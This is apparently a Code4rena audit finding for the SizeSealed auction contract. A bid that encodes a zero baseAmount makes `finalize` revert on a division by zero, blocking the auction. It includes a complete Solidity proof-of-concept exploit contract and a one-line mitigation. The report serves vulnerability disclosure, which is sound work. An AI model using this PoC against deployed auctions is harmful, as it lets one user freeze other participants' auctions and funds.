## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- satisfactory
- selected for report
- M-07

# [Denial of service when `baseAmount` is equal to zero](https://github.com/code-423n4/2022-11-size-findings/issues/332) 

# Lines of code

https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L217
https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L269
https://github.com/transmissions11/solmate/blob/main/src/utils/FixedPointMathLib.sol#L44


# Vulnerability details

# Vulnerability details

## Description

There is a `finalize` function in the `SizeSealed` smart contract. The function traverses the array of the bids sorted by price descending. On each iteration, it [calculates the `quotePerBase`](https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L269). When this variable is calculated, the whole transaction may be reverted due to the internal logic of the calculation.

Here is a part of the logic on the cycle iteration: 

```solidity
bytes32 decryptedMessage = ECCMath.decryptMessage(sharedPoint, b.encryptedMessage);
// If the bidder didn't faithfully submit commitment or pubkey
// Or the bid was cancelled
if (computeCommitment(decryptedMessage) != b.commitment) continue;

// First 128 bits are the base amount, last are random salt
uint128 baseAmount = uint128(uint256(decryptedMessage >> 128));

// Require that bids are passed in descending price
uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);
```

Let's `baseAmount == 0`, then 

```solidity
uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, 0);
```

According to the implementation of the `FixedPointMathLib.mulDivDown`, the transaction will be reverted.

### Attack scenario

A mallicious user may encrypt the message with `baseAmount == 0`, then the auction is impossible to `finalize`. 

## Impact

Any user can make a griffering attack to invalidate the auction.

## PoC

```solidity=
// SPDX-License-Identifier: MIT OR Apache-2.0

pragma solidity =0.8.17;
pragma experimental ABIEncoderV2;

import {SizeSealed} from "SizeSealed.sol";
import {ISizeSealed} from "interfaces/ISizeSealed.sol";
import {ECCMath} from "util/ECCMath.sol";

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract MintableERC20 is ERC20
{
    constructor() ERC20("", "") {

    }

    function mint(address account, uint256 amount) public {
        _mint(account, amount);
    }
}

contract ExternalBidder
{
    uint256 constant privateKey = uint256(0xabcdabcd); 
    function createBid(ERC20 quoteToken, SizeSealed sizeSealed, uint256 auctionId, uint128 quoteAmount, uint256 sellerPrivateKey, bytes32 message) external returns (uint256) {
        quoteToken.approve(address(sizeSealed), quoteAmount);

        (, bytes32 encryptedMessage) = ECCMath.encryptMessage(ECCMath.publicKey(sellerPrivateKey), privateKey, message);

        return sizeSealed.bid(
            auctionId,
            quoteAmount,
            keccak256(abi.encode(message)),
            ECCMath.publicKey(privateKey),
            encryptedMessage,
            "",
            new bytes32[](0)
        );
    }
}

contract PoC
{
    SizeSealed sizeSealed;
    MintableERC20 token1;
    MintableERC20 token2;
    ExternalBidder externalBidder;

    uint256 hackStartTimestamp;

    uint256 firstAuctionId;
    uint256 secondAuctionId;

    uint256 constant privateKey = uint256(0xc0de1234); 

    constructor() {
        sizeSealed = new SizeSealed();
        token1 = new MintableERC20();
        token2 = new MintableERC20();
        externalBidder = new ExternalBidder();
    }

    // First transaction
    function hackStart() external returns (uint256) {
        require(hackStartTimestamp == 0);
        hackStartTimestamp = block.timestamp;

        {
            token1.mint(address(this), 123);
            token1.approve(address(sizeSealed), 123);
            firstAuctionId = createAuction(token1, token2, 123);
            require(firstAuctionId == 1);

            uint256 quoteAmount = 1;
            uint256 baseAmount = 1;
            token2.mint(address(this), quoteAmount);
            token2.transfer(address(externalBidder), quoteAmount);
            uint256 bidId = externalBidder.createBid(
                token2,
                sizeSealed,
                firstAuctionId,
                uint128(quoteAmount),
                privateKey,
                bytes32(baseAmount << 128)
            );
            require(bidId == 0);
        }

        {
            token1.mint(address(this), 321);
            token1.approve(address(sizeSealed), 321);
            secondAuctionId = createAuction(token1, token2, 321);
            require(secondAuctionId == 2);

            uint256 quoteAmount = 1;
            uint256 baseAmount = 0;
            token2.mint(address(this), quoteAmount);
            token2.transfer(address(externalBidder), quoteAmount);
            uint256 bidId = externalBidder.createBid(
                token2,
                sizeSealed,
                secondAuctionId,
                uint128(quoteAmount),
                privateKey,
                bytes32(baseAmount << 128)
            );
            require(bidId == 0);
        }

        return block.timestamp;
    }

    // external to be used in try+catch statement
    function finishAuction(uint256 auctionId) external {
        require(msg.sender == address(this));

        sizeSealed.reveal(auctionId, privateKey, "");
        require(token1.balanceOf(address(this)) == 0);

        uint256[] memory bidIndices = new uint256[](1);
        bidIndices[0] = 0;
        sizeSealed.finalize(auctionId, bidIndices, type(uint128).max, type(uint128).max);
    }

    // Second transaction
    // block.timestamp should be greater or equal to (block.timestamp of the first transaction) + 1
    function hackFinish() external returns (uint256) {
        require(hackStartTimestamp != 0 && block.timestamp >= hackStartTimestamp + 1);

        try this.finishAuction(firstAuctionId) {
            // expected
        } catch {
            revert();
        }

        try this.finishAuction(secondAuctionId) {
            revert();
        } catch {
            // expected
        }

        return block.timestamp;
    }

    function createAuction(ERC20 baseToken, ERC20 quoteToken, uint128 totalBaseAmount) internal returns (uint256) {
        ISizeSealed.AuctionParameters memory auctionParameters;
        auctionParameters.baseToken = address(baseToken);
        auctionParameters.quoteToken = address(quoteToken);
        auctionParameters.reserveQuotePerBase = 0;
        auctionParameters.totalBaseAmount = totalBaseAmount;
        auctionParameters.minimumBidQuote = 0;
        auctionParameters.pubKey = ECCMath.publicKey(privateKey);
        
        ISizeSealed.Timings memory timings;
        timings.startTimestamp = uint32(block.timestamp);
        timings.endTimestamp = uint32(block.timestamp) + 1;
        timings.vestingStartTimestamp = uint32(block.timestamp) + 2;
        timings.vestingEndTimestamp = uint32(block.timestamp) + 3;
        timings.cliffPercent = 1e18; 
        
        return sizeSealed.createAuction(auctionParameters, timings, "");
    }
}
```

## Recommended Mitigation Steps

Add a special check to the `finalize` function to prevent errors in cases when `baseAmount` is equal to zero:

```solidity=
if (baseAmount == 0) continue;
```

